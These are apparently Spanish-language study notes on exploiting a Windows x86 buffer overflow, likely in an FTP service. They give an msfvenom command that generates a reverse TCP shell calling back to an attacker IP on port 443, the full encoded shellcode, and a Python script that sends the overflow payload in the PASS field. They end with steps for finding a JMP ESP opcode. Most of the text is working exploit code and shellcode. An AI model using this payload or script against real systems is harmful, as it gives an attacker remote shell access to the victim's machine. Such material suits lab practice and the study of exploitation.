#BufferOverflow #ShellCode 

Debemos de generar un *shellcode* en hexadecimal a bajo nivel que se encargue de entablar una reverse shell, este *shellcode* será introducido en el *ESP* para que sea interpretado y dos de acceso a la máquina.
Usaremos [[MSFVENOM]]
`msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.22 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread`
	*-p* = Payload
	*--platform* = SO
	*-a* = Arquitectura
	*LHOST* = IP atacante
	*LPORT* = Puerto de escucha
	*-f* = Formato (ej: py, c, js...)
	*-e* = Encoder
	*-b* = Badchars
	*EXITFUNCT=thread* = Para no romper el proceso principal y el servicio siga estando operativo
	
Nos generara el *shellcode*
```shell
"\xbb\xfb\x85\x16\xf3\xdb\xc2\xd9\x74\x24\xf4\x5a\x2b\xc9"
"\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x11\x79\xf4\x06\x19"
"\x6a\x7b\xe8\xe1\x6b\x1c\x60\x04\x5a\x1c\x16\x4d\xcd\xac"
"\x5c\x03\xe2\x47\x30\xb7\x71\x25\x9d\xb8\x32\x80\xfb\xf7"
"\xc3\xb9\x38\x96\x47\xc0\x6c\x78\x79\x0b\x61\x79\xbe\x76"
"\x88\x2b\x17\xfc\x3f\xdb\x1c\x48\xfc\x50\x6e\x5c\x84\x85"
"\x27\x5f\xa5\x18\x33\x06\x65\x9b\x90\x32\x2c\x83\xf5\x7f"
"\xe6\x38\xcd\xf4\xf9\xe8\x1f\xf4\x56\xd5\xaf\x07\xa6\x12"
"\x17\xf8\xdd\x6a\x6b\x85\xe5\xa9\x11\x51\x63\x29\xb1\x12"
"\xd3\x95\x43\xf6\x82\x5e\x4f\xb3\xc1\x38\x4c\x42\x05\x33"
"\x68\xcf\xa8\x93\xf8\x8b\x8e\x37\xa0\x48\xae\x6e\x0c\x3e"
"\xcf\x70\xef\x9f\x75\xfb\x02\xcb\x07\xa6\x4a\x38\x2a\x58"
"\x8b\x56\x3d\x2b\xb9\xf9\x95\xa3\xf1\x72\x30\x34\xf5\xa8"
"\x84\xaa\x08\x53\xf5\xe3\xce\x07\xa5\x9b\xe7\x27\x2e\x5b"
"\x07\xf2\xe1\x0b\xa7\xad\x41\xfb\x07\x1e\x2a\x11\x88\x41"
"\x4a\x1a\x42\xea\xe1\xe1\x05\xd5\x5e\xe8\xc3\xbd\x9c\xea"
"\xea\x86\x28\x0c\x86\xe8\x7c\x87\x3f\x90\x24\x53\xa1\x5d"
"\xf3\x1e\xe1\xd6\xf0\xdf\xac\x1e\x7c\xf3\x59\xef\xcb\xa9"
"\xcc\xf0\xe1\xc5\x93\x63\x6e\x15\xdd\x9f\x39\x42\x8a\x6e"
"\x30\x06\x26\xc8\xea\x34\xbb\x8c\xd5\xfc\x60\x6d\xdb\xfd"
"\xe5\xc9\xff\xed\x33\xd1\xbb\x59\xec\x84\x15\x37\x4a\x7f"
"\xd4\xe1\x04\x2c\xbe\x65\xd0\x1e\x01\xf3\xdd\x4a\xf7\x1b"
"\x6f\x23\x4e\x24\x40\xa3\x46\x5d\xbc\x53\xa8\xb4\x04\x73"
"\x4b\x1c\x71\x1c\xd2\xf5\x38\x41\xe5\x20\x7e\x7c\x66\xc0"
"\xff\x7b\x76\xa1\xfa\xc0\x30\x5a\x77\x58\xd5\x5c\x24\x59"
"\xfc"
```

Este código lo implementaremos en el exploit:
```python
	#!/usr/bin/python3
	
	import socket
	import sys
	
	#Variables globales
	ip_adress = <IP_Victima>
	port = <Puerto>
	offset = 4654 #Ofset que nos ha dado metasploit
	
	before_eip = b"A"*offset #Cadena de A antes de llegar al offset(valor del EIP)
	eip = b"B"*4 #Cadena con el valor del EIP, es *4 por que es la capacidad del registro EIP
	
	shellcode = (b"\xbb\xfb\x85\x16\xf3\xdb\xc2\xd9\x74\x24\xf4\x5a\x2b\xc9"
				 b"\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x11\x79\xf4\x06\x19"
				 b"\x6a\x7b\xe8\xe1\x6b\x1c\x60\x04\x5a\x1c\x16\x4d\xcd\xac"
				 b"\x5c\x03\xe2\x47\x30\xb7\x71\x25\x9d\xb8\x32\x80\xfb\xf7"
				 b"\xc3\xb9\x38\x96\x47\xc0\x6c\x78\x79\x0b\x61\x79\xbe\x76"
				 b"\x88\x2b\x17\xfc\x3f\xdb\x1c\x48\xfc\x50\x6e\x5c\x84\x85"
				 b"\x27\x5f\xa5\x18\x33\x06\x65\x9b\x90\x32\x2c\x83\xf5\x7f"
				 b"\xe6\x38\xcd\xf4\xf9\xe8\x1f\xf4\x56\xd5\xaf\x07\xa6\x12"
				 b"\x17\xf8\xdd\x6a\x6b\x85\xe5\xa9\x11\x51\x63\x29\xb1\x12"
				 b"\xd3\x95\x43\xf6\x82\x5e\x4f\xb3\xc1\x38\x4c\x42\x05\x33"
				 b"\x68\xcf\xa8\x93\xf8\x8b\x8e\x37\xa0\x48\xae\x6e\x0c\x3e"
				 b"\xcf\x70\xef\x9f\x75\xfb\x02\xcb\x07\xa6\x4a\x38\x2a\x58"
				 b"\x8b\x56\x3d\x2b\xb9\xf9\x95\xa3\xf1\x72\x30\x34\xf5\xa8"
				 b"\x84\xaa\x08\x53\xf5\xe3\xce\x07\xa5\x9b\xe7\x27\x2e\x5b"
				 b"\x07\xf2\xe1\x0b\xa7\xad\x41\xfb\x07\x1e\x2a\x11\x88\x41"
				 b"\x4a\x1a\x42\xea\xe1\xe1\x05\xd5\x5e\xe8\xc3\xbd\x9c\xea"
				 b"\xea\x86\x28\x0c\x86\xe8\x7c\x87\x3f\x90\x24\x53\xa1\x5d"
				 b"\xf3\x1e\xe1\xd6\xf0\xdf\xac\x1e\x7c\xf3\x59\xef\xcb\xa9"
				 b"\xcc\xf0\xe1\xc5\x93\x63\x6e\x15\xdd\x9f\x39\x42\x8a\x6e"
				 b"\x30\x06\x26\xc8\xea\x34\xbb\x8c\xd5\xfc\x60\x6d\xdb\xfd"
				 b"\xe5\xc9\xff\xed\x33\xd1\xbb\x59\xec\x84\x15\x37\x4a\x7f"
				 b"\xd4\xe1\x04\x2c\xbe\x65\xd0\x1e\x01\xf3\xdd\x4a\xf7\x1b"
				 b"\x6f\x23\x4e\x24\x40\xa3\x46\x5d\xbc\x53\xa8\xb4\x04\x73"
				 b"\x4b\x1c\x71\x1c\xd2\xf5\x38\x41\xe5\x20\x7e\x7c\x66\xc0"
				 b"\xff\x7b\x76\xa1\xfa\xc0\x30\x5a\x77\x58\xd5\x5c\x24\x59"
				 b"\xfc")
	
	payload = before_eip + eip + shellcode
	
	#Exploit
	def exploit():
		
		#Crar socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		
		#Conectar con el servidor
		s.connect((ip_adress, port))
		
		#Recibir la respuest(banner)
		banner = s.recv(1024)
		
		s.send(b"USER test" + b'\r\n') #Enviamos un usuario en el campo USER aleatorio en este caso TEST
		response = s.recv(1024)
		s.send(b"PASS " + payload + b'\r\n') #En el campo PASS introducira el payload que es igual a 4654 + eip
		s.close()
		
	if __name__ == '__main__':
		
		exploit()
```


Una vez detectados los *badchars* y generado el *shellcode* tendremos que buscar un *OpCode (Operaration Code)* que ejecute un *jump* a *ESP*
Para eso usaremos `!mona modules` en donde las 4 primeras columnas tienes que estar en FALSE, nos copiamos la dirección del modulo.
Ahora buscaremos la instrucción tipo *jump ESP* para ver si dentro del modulo que hemos encontrado hace esta *OpCode*
Para saber el *OpCode* usaremos `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`


